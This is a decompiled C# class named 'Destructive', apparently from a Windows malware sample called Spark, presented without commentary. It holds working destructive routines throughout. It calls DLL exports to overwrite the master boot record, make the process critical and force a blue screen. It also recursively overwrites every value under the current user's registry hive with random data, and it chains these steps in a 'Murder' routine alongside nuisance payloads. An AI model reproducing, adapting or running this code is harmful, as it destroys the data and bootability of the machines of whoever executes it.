// Decompiled with JetBrains decompiler
// Type: Spark.Destructive
// Assembly: Spark, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2DFB06E8-4427-4218-A5F6-F5DE139079B1
// Assembly location: C:\Users\adriel\Downloads\Spark\Chris@Spark.exe

using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

#nullable disable
namespace Spark;

internal class Destructive
{
  [DllImport("C:\\Windows\\File Cache\\DLL.dll", EntryPoint = "?OverwriteMasterBootRecord@Export@SparkDLL@@QAEXXZ", CharSet = CharSet.Unicode)]
  public static extern void OverwriteMasterBootRecord();

  [DllImport("C:\\Windows\\File Cache\\DLL.dll", EntryPoint = "?CriticalMode@Export@SparkDLL@@QAE_NK@Z", CharSet = CharSet.Unicode)]
  public static extern bool CriticalMode(ulong a);

  [DllImport("C:\\Windows\\File Cache\\DLL.dll", EntryPoint = "?BasicBsod@Export@SparkDLL@@QAEXXZ", CharSet = CharSet.Unicode)]
  public static extern void BasicBsod();

  public static void MemoryDump(int colour) => Driver.SendIOCTL(colour);

  public static void Murder()
  {
    Destructive.Corrupt(Registry.CurrentUser);
    Destructive.OverwriteMasterBootRecord();
    Destructive.MemoryDump(1);
  }

  public static void RandomScreenOfDeath() => Destructive.MemoryDump(new Random().Next(3) + 1);

  public static void Nuke()
  {
    Task.Run((Action) (() => Standard.ErrorSounds()));
    Task.Run((Action) (() => Standard.ShowAllWindows()));
    Task.Run((Action) (() => Standard.SendMessagePayload()));
    Task.Run((Action) (() => Standard.GlitchCards()));
    Task.Run((Action) (() => Standard.ShootingStars()));
    Task.Run((Action) (() => Standard.PrintRotate()));
  }

  public static void CorruptKey(RegistryKey key, string keyname)
  {
    Random random = new Random();
    string str1 = "";
    string str2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    object obj = key.GetValue(keyname, (object) null, RegistryValueOptions.DoNotExpandEnvironmentNames);
    switch (key.GetValueKind(keyname))
    {
      case RegistryValueKind.String:
      case RegistryValueKind.ExpandString:
        foreach (int num in (string) obj)
          str1 += str2[random.Next(str2.Length + 1)].ToString();
        obj = (object) str1;
        break;
      case RegistryValueKind.Binary:
        foreach (byte num in (byte[]) obj)
          num = (byte) random.Next(0, 256 /*0x0100*/);
        break;
      case RegistryValueKind.DWord:
      case RegistryValueKind.QWord:
        obj = (object) random.Next();
        break;
      case RegistryValueKind.MultiString:
        string[] strArray = (string[]) obj;
        for (int index1 = 0; index1 <= strArray.Length; ++index1)
        {
          for (int index2 = 0; index2 < strArray[index1].Length; ++index2)
            str1 += str2[random.Next(str2.Length + 1)].ToString();
          strArray[index1] = str1;
        }
        break;
    }
    key.SetValue(keyname, obj, key.GetValueKind(keyname));
    key.Close();
  }

  public static void GetSubkeysAndCorrupt(RegistryKey root)
  {
    foreach (string subKeyName in root.GetSubKeyNames())
    {
      try
      {
        Destructive.Corrupt(root.CreateSubKey(subKeyName));
      }
      catch (Exception ex)
      {
      }
    }
  }

  public static void Corrupt(RegistryKey root)
  {
    Destructive.GetSubkeysAndCorrupt(root);
    foreach (string valueName in root.GetValueNames())
    {
      try
      {
        Destructive.CorruptKey(root, valueName);
      }
      catch (Exception ex)
      {
      }
    }
  }
}
